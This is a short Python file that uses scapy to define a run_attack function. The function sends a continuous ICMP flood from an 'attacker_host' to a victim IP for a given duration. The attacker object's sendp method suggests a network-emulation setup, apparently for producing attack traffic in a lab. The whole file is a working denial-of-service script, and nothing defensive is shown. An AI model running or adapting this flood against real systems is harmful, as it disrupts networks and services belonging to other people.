from scapy.all import Ether, IP, ICMP, sendp
import time

def run_attack(attacker_host, victim_ip, duration):
    print(f"Starting ICMP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    start_time = time.time()
    while time.time() - start_time < duration:
        # Craft ICMP packet
        packet = Ether()/IP(dst=victim_ip)/ICMP()
        attacker_host.sendp(packet)
    print(f"ICMP Flood from {attacker_host.name} to {victim_ip} finished.")